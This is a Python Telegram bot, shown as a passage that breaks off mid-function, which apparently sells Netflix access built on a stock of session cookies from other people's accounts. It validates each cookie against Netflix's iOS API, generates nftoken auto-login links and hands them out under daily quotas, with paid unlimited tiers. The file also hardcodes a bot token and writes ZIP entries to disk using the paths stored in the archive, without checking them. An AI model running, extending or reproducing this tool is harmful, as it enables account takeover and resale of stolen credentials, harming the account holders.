import json
import os
import random
import re
import shutil
import tempfile
import urllib.parse
import zipfile
from datetime import datetime, timezone, timedelta

import requests
from urllib3.exceptions import InsecureRequestWarning

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ==================== CONFIG ====================
BOT_TOKEN = "8419778721:AAHhCD8qDIaP0u54tFN2qowMTR-s8Chu4mY"

OWNER_IDS = {
    5954938418,
}

DAILY_LIMIT = 10
OWNER_USERNAME = "@username_"
TIMEZONE = timezone(timedelta(hours=8))

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
COOKIE_FOLDER = os.path.join(SCRIPT_DIR, "NetCookie")
USAGE_FILE = os.path.join(SCRIPT_DIR, "usage.json")
PREMIUM_FILE = os.path.join(SCRIPT_DIR, "premium.json")
LOG_FILE = os.path.join(SCRIPT_DIR, "bot.log")

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# ==================== LOGGER ====================
def log(msg):
    ts = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except Exception:
        pass


# ==================== USAGE TRACKING ====================
def _today_str():
    return datetime.now(TIMEZONE).strftime("%Y-%m-%d")


def load_usage():
    if not os.path.exists(USAGE_FILE):
        return {}
    try:
        with open(USAGE_FILE, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except Exception:
        return {}


def save_usage(data):
    try:
        tmp = USAGE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
        os.replace(tmp, USAGE_FILE)
    except Exception as exc:
        log(f"Failed to save usage: {exc}")


# ==================== PREMIUM ====================
def load_premium():
    if not os.path.exists(PREMIUM_FILE):
        return set()
    try:
        with open(PREMIUM_FILE, "r", encoding="utf-8") as fh:
            return set(str(k) for k in json.load(fh).keys())
    except Exception:
        return set()


def save_premium(data):
    try:
        tmp = PREMIUM_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump({k: True for k in data}, fh, indent=2)
        os.replace(tmp, PREMIUM_FILE)
    except Exception as exc:
        log(f"Failed to save premium: {exc}")


def is_premium(user_id):
    return str(user_id) in load_premium()


def add_premium(user_id):
    data = load_premium()
    data.add(str(user_id))
    save_premium(data)


def remove_premium(user_id):
    data = load_premium()
    data.discard(str(user_id))
    save_premium(data)


def has_unlimited(user_id):
    return is_owner(user_id) or is_premium(user_id)


# ==================== QUOTA ====================
def get_remaining(user_id):
    if has_unlimited(user_id):
        return 999999
    data = load_usage()
    today = _today_str()
    entry = data.get(str(user_id), {})
    if entry.get("date") != today:
        return DAILY_LIMIT
    used = entry.get("count", 0)
    return max(0, DAILY_LIMIT - used)


def consume_quota(user_id):
    if has_unlimited(user_id):
        return 999999
    data = load_usage()
    today = _today_str()
    key = str(user_id)
    entry = data.get(key, {})
    if entry.get("date") != today:
        entry = {"date": today, "count": 0}
    entry["count"] = entry.get("count", 0) + 1
    data[key] = entry
    save_usage(data)
    return max(0, DAILY_LIMIT - entry["count"])


def get_global_stats():
    data = load_usage()
    today = _today_str()
    total_users = len(data)
    today_users = sum(1 for v in data.values() if v.get("date") == today)
    today_requests = sum(v.get("count", 0) for v in data.values() if v.get("date") == today)
    return {
        "total_users": total_users,
        "today_users": today_users,
        "today_requests": today_requests,
    }


def reset_user_quota(user_id):
    data = load_usage()
    data.pop(str(user_id), None)
    save_usage(data)


def reset_all_quota():
    save_usage({})


# ==================== COOKIE HANDLING ====================
def get_cookie_files():
    """Baca fail .txt dalam subfolder NetCookie/ dan return senarai (rel_path, plan)."""
    if not os.path.isdir(COOKIE_FOLDER):
        os.makedirs(COOKIE_FOLDER, exist_ok=True)
        return []
    files = []
    for root, dirs, filenames in os.walk(COOKIE_FOLDER):
        for f in filenames:
            if f.lower().endswith(".txt"):
                full_path = os.path.join(root, f)
                rel_path = os.path.relpath(full_path, COOKIE_FOLDER)
                parts = rel_path.split(os.sep)
                plan = parts[0] if len(parts) > 1 else "Unknown"
                files.append((rel_path, plan))
    return files


def get_stock_by_plan():
    """Kira stock mengikut plan dari subfolder."""
    stock = {"Premium": 0, "Standard": 0, "Basic": 0, "Unknown": 0}
    for _, plan in get_cookie_files():
        if plan in stock:
            stock[plan] += 1
        else:
            stock["Unknown"] += 1
    return stock


def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}


def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def extract_cookie_dict(text):
    cookie_dict = {}

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = _decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)

    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = _decode_cookie_value(match.group(1))

    return cookie_dict


def build_nftoken_link(token):
    return "https://netflix.com/?nftoken=" + token


def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing NetflixId")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    response = requests.get(
        API_URL, params=QUERY_PARAMS, headers=headers, timeout=30, verify=False,
    )
    response.raise_for_status()

    data = response.json()

    value = data.get("value") or {}
    if isinstance(value, dict):
        if "error" in value or "errors" in data:
            raise ValueError("API error")

    token_data = (
        ((value.get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("No token in response")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires


def validate_netflix_cookie(cookie_dict):
    """Check kalau cookie Netflix masih valid dan account aktif."""
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        return False

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    try:
        response = requests.get(
            API_URL,
            params=QUERY_PARAMS,
            headers=headers,
            timeout=15,
            verify=False,
        )

        if response.status_code != 200:
            return False

        data = response.json()

        if "error" in data or "errors" in data:
            return False

        value = data.get("value") or {}
        account = value.get("account") or {}
        if not account:
            return False

        token_data = (account.get("token") or {}).get("default") or {}
        if not token_data.get("token"):
            return False

        membership = account.get("membership") or {}
        status = membership.get("status", "")
        if status in ("CANCELLED", "EXPIRED", "ON_HOLD", "PAUSED"):
            return False

        return True

    except Exception:
        return False


def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires, tz=TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)


def is_expired(expires):
    if not isinstance(expires, (int, float)):
        return False
    try:
        return datetime.now(TIMEZONE).timestamp() >= expires
    except Exception:
        return False


def parse_cookie_filename_info(filename):
    info = {
        "plan": "Unknown",
        "payments": "-",
        "extra": "-",
        "country": "-",
        "email": "-",
    }
    if not filename:
        return info

    name = filename
    if name.lower().endswith(".txt"):
        name = name[:-4]

    brackets = re.findall(r"\[([^\]]*)\]", name)
    if len(brackets) >= 5:
        info["plan"] = brackets[0].strip() or "Unknown"
        info["payments"] = brackets[1].strip()
        info["extra"] = brackets[2].strip()
        info["country"] = brackets[3].strip()
        info["email"] = brackets[4].strip()
    elif len(brackets) >= 1:
        info["plan"] = brackets[0].strip() or "Unknown"

    return info


# ==================== CLEANUP ====================
def cleanup_non_premium_files():
    if not os.path.isdir(COOKIE_FOLDER):
        log("[CLEANUP] NetCookie folder not found. Skipping.")
        return

    files = get_cookie_files()
    if not files:
        log("[CLEANUP] No cookie files found. Nothing to delete.")
        return

    deleted = []
    kept_names = set()

    for rel_path, plan in sorted(files):
        path = os.path.join(COOKIE_FOLDER, rel_path)
        lower_name = os.path.basename(rel_path).lower()

        if "premium" not in lower_name:
            try:
                os.remove(path)
                deleted.append((rel_path, "no 'premium' in name"))
            except Exception as exc:
                log(f"[CLEANUP] Failed to delete {rel_path}: {exc}")
            continue

        if lower_name in kept_names:
            try:
                os.remove(path)
                deleted.append((rel_path, "duplicate name"))
            except Exception as exc:
                log(f"[CLEANUP] Failed to delete {rel_path}: {exc}")
            continue

        kept_names.add(lower_name)

    if deleted:
        log(f"[CLEANUP] Deleted {len(deleted)} file(s):")
        for fname, reason in deleted:
            log(f"[CLEANUP]   - {fname}  ({reason})")
    else:
        log("[CLEANUP] All files are clean. Nothing deleted.")


def _safe_remove(path, reason=""):
    try:
        if os.path.exists(path):
            os.remove(path)
            fname = os.path.basename(path)
            log(f"[AUTO-DELETE] {fname}  ({reason})")
    except Exception as exc:
        log(f"[AUTO-DELETE] Failed {path}: {exc}")


# ==================== ZIP UPLOAD ====================
def process_zip_upload(zip_path):
    saved = 0
    skipped = 0
    failed = 0
    errors = []

    os.makedirs(COOKIE_FOLDER, exist_ok=True)

    try:
        zf = zipfile.ZipFile(zip_path, "r")
    except zipfile.BadZipFile:
        return 0, 0, 0, ["Invalid ZIP file"]
    except Exception as exc:
        return 0, 0, 0, [f"ZIP open failed: {exc}"]

    try:
        for info in zf.infolist():
            if info.is_dir():
                continue

            raw_name = info.filename.replace("\\", "/")
            fname = os.path.basename(raw_name)

            if not fname or fname in (".", ".."):
                skipped += 1
                continue

            if not fname.lower().endswith(".txt"):
                skipped += 1
                continue

            if "premium" not in fname.lower():
                skipped += 1
                continue

            try:
                with zf.open(info) as src:
                    raw_bytes = src.read()
            except Exception:
                failed += 1
                errors.append(f"{fname}: read fail")
                continue

            try:
                content = raw_bytes.decode("utf-8", errors="ignore").strip()
            except Exception:
                failed += 1
                errors.append(f"{fname}: decode fail")
                continue

            if not content:
                failed += 1
                errors.append(f"{fname}: empty")
                continue

            cookie_dict = extract_cookie_dict(content)
            if not cookie_dict or REQUIRED_COOKIE not in cookie_dict:
                failed += 1
                errors.append(f"{fname}: no NetflixId")
                continue

            # Kekalkan struktur folder dari ZIP
            dest = os.path.join(COOKIE_FOLDER, raw_name)
            try:
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                with open(dest, "w", encoding="utf-8") as fh:
                    fh.write(content)
                saved += 1
                log(f"[UPLOAD] Saved {raw_name}")
            except Exception:
                failed += 1
                errors.append(f"{fname}: write fail")
    finally:
        zf.close()

    return saved, skipped, failed, errors


# ==================== CORE ====================
def try_get_login_url(max_attempts=15):
    reasons = []
    txt_files = get_cookie_files()
    if not txt_files:
        return False, None, None, "No cookie files in NetCookie folder.", None, None

    tried = set()
    total = len(txt_files)

    while len(tried) < total and len(tried) < max_attempts:
        remaining = [f for f in txt_files if f[0] not in tried]
        if not remaining:
            break
        chosen_file, chosen_plan = random.choice(remaining)
        tried.add(chosen_file)
        chosen_path = os.path.join(COOKIE_FOLDER, chosen_file)

        try:
            with open(chosen_path, "r", encoding="utf-8", errors="ignore") as fh:
                content = fh.read().strip()
        except Exception:
            _safe_remove(chosen_path, "read failed")
            continue

        if not content:
            _safe_remove(chosen_path, "empty file")
            continue

        cookie_dict = extract_cookie_dict(content)
        if not cookie_dict or REQUIRED_COOKIE not in cookie_dict:
            reasons.append("no NetflixId")
            _safe_remove(chosen_path, "no NetflixId")
            continue

        if not validate_netflix_cookie(cookie_dict):
            reasons.append("cookie invalid/expired")
            _safe_remove(chosen_path, "cookie invalid/expired")
            continue

        try:
            token, expires = fetch_nftoken(cookie_dict)
        except requests.HTTPError as exc:
            reasons.append(f"HTTP {exc.response.status_code}")
            _safe_remove(chosen_path, f"HTTP {exc.response.status_code}")
            continue
        except Exception as exc:
            msg = str(exc) or type(exc).__name__
            reasons.append(msg[:40])
            _safe_remove(chosen_path, msg[:40])
            continue

        if not token:
            reasons.append("empty token")
            _safe_remove(chosen_path, "empty token")
            continue

        if is_expired(expires):
            reasons.append("expired")
            _safe_remove(chosen_path, "expired token")
            continue

        info = {
            "plan": chosen_plan,
            "country": "-",
            "email": "-",
        }
        return True, build_nftoken_link(token), expires, None, chosen_file, info

    summary = "; ".join(reasons[-3:]) if reasons else "unknown"
    return False, None, None, f"No valid account. Reason: {summary}", None, None


# ==================== HELPERS ====================
def is_owner(user_id):
    return user_id in OWNER_IDS


def mask_id(uid):
    s = str(uid)
    if len(s) <= 6:
        return s
    return f"{s[:4]}***{s[-2:]}"


def mask_email(email):
    if not email or "@" not in email:
        return email
    local, domain = email.split("@", 1)
    if len(local) > 3:
        return f"{local[:3]}***@{domain}"
    elif len(local) > 0:
        return f"{local[0]}***@{domain}"
    return email


def build_main_menu():
    keyboard = [
        [
            InlineKeyboardButton("🎬 Get URL", callback_data="menu_get"),
            InlineKeyboardButton("📊 My Quota", callback_data="menu_quota"),
        ],
        [
            InlineKeyboardButton("💎 Premium", callback_data="menu_premium"),
            InlineKeyboardButton("📈 Stats", callback_data="menu_stats"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


def build_url_message(url, expires, info, quota_line):
    return (
        f"🎉 <b>LOGIN URL GENERATED</b> 🎉\n"
        f"╔══════════════════════════╗\n"
        f"   🎬 <b>Plan</b>     ➜  <b>{info['plan']}</b>\n"
        f"   ⏰ <b>Expiry</b>   ➜  <b>{format_expiry(expires)}</b>\n"
        f"   {quota_line}\n"
        f"╚══════════════════════════╝\n\n"
        f"🔗 <b>Login link:</b>\n"
        f"<code>{url}</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 <b>PHONE / TABLET / LAPTOP</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>1.</b> Open the link on your device\n"
        f"      🍎 iOS  ➜  <b>Safari</b>\n"
        f"      🤖 Android  ➜  <b>Chrome</b>\n"
        f"      💻 Desktop  ➜  <b>Any browser</b>\n\n"
        f"<b>2.</b> Tap <b>\"Open App\"</b> to launch Netflix\n"
        f"      → Auto-login ✅\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📺 <b>SMART TV</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>1.</b> Login first on your 📱 phone:\n"
        f"      → Open the link above\n"
        f"      → Netflix auto-login ✅\n\n"
        f"<b>2.</b> Open <b>Netflix</b> on your 📺 TV\n"
        f"      → Choose <b>Sign In</b>\n"
        f"      → Get the <b>8-character code</b>\n\n"
        f"<b>3.</b> On your phone browser, go to:\n"
        f"      <code>netflix.com/tv2</code>\n"
        f"      → Enter the code\n"
        f"      → Tap <b>Activate</b>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ <b>IMPORTANT</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"   ❌ <b>DO NOT</b> use Incognito / Private Mode\n"
        f"   ✅ Use a normal browser only\n"
        f"   🔗 Same URL works on <b>all devices</b>\n"
        f"   ⏱️ URL valid for <b>~1 hour</b> (reusable)"
    )


def build_quota_line(user_id, remaining_after):
    if is_owner(user_id):
        return "👑 Owner — Unlimited (∞)"
    elif is_premium(user_id):
        return "💎 Premium — Unlimited (∞)"
    else:
        return f"📊 Remaining: <b>{remaining_after}/{DAILY_LIMIT}</b>"


# ==================== USER HANDLERS ====================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    remaining = get_remaining(user.id)

    if is_owner(user.id):
        tag = " 👑"
        status = "👑 <b>Owner</b> — Unlimited quota (∞)"
    elif is_premium(user.id):
        tag = " 💎"
        status = "💎 <b>Premium</b> — Unlimited quota (∞)"
    else:
        tag = ""
        status = f"📊 <b>Remaining quota:</b> {remaining}/{DAILY_LIMIT}"

    stock = get_stock_by_plan()
    stock_text = (
        f"📦 <b>Stock:</b>\n"
        f"   💎 Premium: <b>{stock['Premium']}</b>\n"
        f"   ⭐ Standard: <b>{stock['Standard']}</b>\n"
        f"   🔹 Basic: <b>{stock['Basic']}</b>"
    )

    text = (
        f"👋 Hi {user.first_name}{tag}!\n\n"
        f"🤖 I can generate Netflix login URLs for you.\n\n"
        f"{status}\n\n"
        f"{stock_text}\n\n"
        f"📌 <b>Commands:</b>\n"
        f"/get - Get login URL (all devices)\n"
        f"/quota - Check quota\n"
        f"/stats - Bot statistics\n"
        f"/premium - Premium info (unlimited)\n"
    )
    if is_owner(user.id):
        text += (
            f"\n👑 <b>Owner Commands:</b>\n"
            f"/upload - Upload ZIP of cookies\n"
            f"/cancel_upload - Cancel upload mode\n"
            f"/reload - Count cookie files\n"
            f"/reset_me - Reset own quota\n"
            f"/reset &lt;user_id&gt; - Reset user quota\n"
            f"/reset_all - Reset all quotas\n"
            f"/broadcast &lt;msg&gt; - Send to all users\n"
            f"/admin_stats - Full statistics\n"
            f"/addpremium &lt;user_id&gt; - Add premium\n"
            f"/delpremium &lt;user_id&gt; - Remove premium\n"
            f"/listpremium - List premium users\n"
        )

    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        reply_markup=build_main_menu(),
    )


async def quota_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_owner(user.id):
        text = "👑 Owner — Unlimited quota (∞)"
    elif is_premium(user.id):
        text = "💎 Premium — Unlimited quota (∞)"
    else:
        remaining = get_remaining(user.id)
        text = f"📊 Your quota today: <b>{remaining}/{DAILY_LIMIT}</b>"
    await update.message.reply_text(
        text, parse_mode=ParseMode.HTML, reply_markup=build_main_menu(),
    )


async def stats_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = get_global_stats()
    stock = get_stock_by_plan()
    total_files = sum(stock.values())
    text = (
        f"📈 <b>Bot Statistics</b>\n\n"
        f"👥 Total users: <b>{s['total_users']}</b>\n"
        f"🟢 Active today: <b>{s['today_users']}</b>\n"
        f"🎯 Requests today: <b>{s['today_requests']}</b>\n\n"
        f"📦 <b>Stock by Plan:</b>\n"
        f"   💎 Premium: <b>{stock['Premium']}</b>\n"
        f"   ⭐ Standard: <b>{stock['Standard']}</b>\n"
        f"   🔹 Basic: <b>{stock['Basic']}</b>\n"
        f"   📁 Total: <b>{total_files}</b>"
    )
    await update.message.reply_text(
        text, parse_mode=ParseMode.HTML, reply_markup=build_main_menu(),
    )


async def _do_get_url(message, user):
    remaining_before = get_remaining(user.id)

    if remaining_before <= 0:
        await message.reply_text(
            f"❌ Your quota is finished for today ({DAILY_LIMIT}/{DAILY_LIMIT}).\n\n"
            f"💎 Want unlimited? Type /premium for info.",
            parse_mode=ParseMode.HTML,
            reply_markup=build_main_menu(),
        )
        return

    msg = await message.reply_text("⏳ Generating URL...")

    success, url, expires, error, filename, info = try_get_login_url(max_attempts=15)

    if not success:
        log(f"[GET-FAIL] user={user.id} reason={error}")
        await msg.edit_text(
            f"⚠️ <b>Failed to get URL</b>\n\n"
            f"Reason: <code>{error}</code>\n\n"
            f"✅ Your quota was <b>NOT</b> deducted.\n"
            f"📊 Remaining: <b>{remaining_before}/{DAILY_LIMIT}</b>\n\n"
            f"💡 Try again later.",
            parse_mode=ParseMode.HTML,
            reply_markup=build_main_menu(),
        )
        return

    remaining_after = consume_quota(user.id)
    log(f"[GET-OK] user={user.id} file={filename[:60]}")

    quota_line = build_quota_line(user.id, remaining_after)
    text = build_url_message(url, expires, info, quota_line)

    await msg.edit_text(
        text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=build_main_menu(),
    )


async def get_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await _do_get_url(update.message, update.effective_user)


async def premium_info_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if is_owner(user.id):
        text = "👑 You are the <b>Owner</b>!\nYour quota is unlimited (∞)."
    elif is_premium(user.id):
        text = (
            "💎 You are a <b>Premium user</b>!\n"
            "Your quota is unlimited (∞) — use /get as much as you want."
        )
    else:
        text = (
            f"💎 <b>PREMIUM</b> 💎\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"✅ <b>Unlimited</b> quota (∞)\n"
            f"✅ Use /get as much as you want\n"
            f"✅ No daily limit\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📩 Contact the owner to get premium:\n"
            f"👤 Owner: {OWNER_USERNAME}"
        )

    await update.message.reply_text(
        text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=build_main_menu(),
    )


# ==================== MENU CALLBACK ====================
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user = update.effective_user

    if data == "menu_get":
        await _do_get_url(query.message, user)

    elif data == "menu_quota":
        if is_owner(user.id):
            text = "👑 Owner — Unlimited quota (∞)"
        elif is_premium(user.id):
            text = "💎 Premium — Unlimited quota (∞)"
        else:
            remaining = get_remaining(user.id)
            text = f"📊 Your quota today: <b>{remaining}/{DAILY_LIMIT}</b>"
        await query.message.reply_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=build_main_menu(),
        )

    elif data == "menu_premium":
        if is_owner(user.id):
            text = "👑 You are the <b>Owner</b>!\nYour quota is unlimited (∞)."
        elif is_premium(user.id):
            text = (
                "💎 You are a <b>Premium user</b>!\n"
                "Your quota is unlimited (∞) — use /get as much as you want."
            )
        else:
            text = (
                f"💎 <b>PREMIUM</b> 💎\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"✅ <b>Unlimited</b> quota (∞)\n"
                f"✅ Use /get as much as you want\n"
                f"✅ No daily limit\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📩 Contact the owner to get premium:\n"
                f"👤 Owner: {OWNER_USERNAME}"
            )
        await query.message.reply_text(
            text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            reply_markup=build_main_menu(),
        )

    elif data == "menu_stats":
        s = get_global_stats()
        stock = get_stock_by_plan()
        total_files = sum(stock.values())
        text = (
            f"📈 <b>Bot Statistics</b>\n\n"
            f"👥 Total users: <b>{s['total_users']}</b>\n"
            f"🟢 Active today: <b>{s['today_users']}</b>\n"
            f"🎯 Requests today: <b>{s['today_requests']}</b>\n\n"
            f"📦 <b>Stock by Plan:</b>\n"
            f"   💎 Premium: <b>{stock['Premium']}</b>\n"
            f"   ⭐ Standard: <b>{stock['Standard']}</b>\n"
            f"   🔹 Basic: <b>{stock['Basic']}</b>\n"
            f"   📁 Total: <b>{total_files}</b>"
        )
        await query.message.reply_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=build_main_menu(),
        )


# ==================== OWNER HANDLERS ====================
def owner_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user = update.effective_user
        if not is_owner(user.id):
            await update.message.reply_text("❌ This command is for owner only.")
            return
        return await func(update, context)
    return wrapper


@owner_only
async def upload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["awaiting_zip"] = True
    await update.message.reply_text(
        "📤 <b>ZIP Upload Mode</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Send me a <b>.zip</b> file containing cookie <code>.txt</code> files.\n\n"
        "📌 <b>Rules:</b>\n"
        "   ✅ Only <code>.txt</code> files inside ZIP\n"
        "   ✅ Filename must contain <code>premium</code>\n"
        "   ✅ Content must have <code>NetflixId</code>\n"
        "   📁 Folder structure will be preserved (Premium/Standard/Basic)\n"
        "   🔄 Duplicate names will be overwritten\n\n"
        "💡 Type /cancel_upload to cancel.",
        parse_mode=ParseMode.HTML,
    )


@owner_only
async def cancel_upload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop("awaiting_zip", None)
    await update.message.reply_text("❌ Upload mode cancelled.")


async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if not is_owner(user.id):
        return

    if not context.user_data.get("awaiting_zip"):
        return

    doc = update.message.document
    if not doc:
        return

    fname = doc.file_name or ""
    if not fname.lower().endswith(".zip"):
        await update.message.reply_text(
            "❌ Please send a <b>.zip</b> file. Type /cancel_upload to cancel.",
            parse_mode=ParseMode.HTML,
        )
        return

    context.user_data.pop("awaiting_zip", None)

    msg = await update.message.reply_text("📥 Downloading ZIP...")

    tmp_dir = tempfile.mkdtemp(prefix="cookie_zip_")
    zip_path = os.path.join(tmp_dir, "upload.zip")

    try:
        tg_file = await doc.get_file()
        await tg_file.download_to_drive(zip_path)
    except Exception as exc:
        log(f"[UPLOAD] Download failed: {exc}")
        await msg.edit_text(
            f"❌ <b>Download failed</b>\n\n<code>{exc}</code>",
            parse_mode=ParseMode.HTML,
        )
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return

    await msg.edit_text("📦 Extracting & validating...")

    try:
        saved, skipped, failed, errors = process_zip_upload(zip_path)
    except Exception as exc:
        log(f"[UPLOAD] Process failed: {exc}")
        await msg.edit_text(
            f"❌ <b>Extract failed</b>\n\n<code>{exc}</code>",
            parse_mode=ParseMode.HTML,
        )
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return

    shutil.rmtree(tmp_dir, ignore_errors=True)

    stock = get_stock_by_plan()
    total_now = sum(stock.values())
    log(f"[UPLOAD] user={user.id} saved={saved} skipped={skipped} failed={failed} total={total_now}")

    text = (
        f"✅ <b>Upload Complete</b>\n"
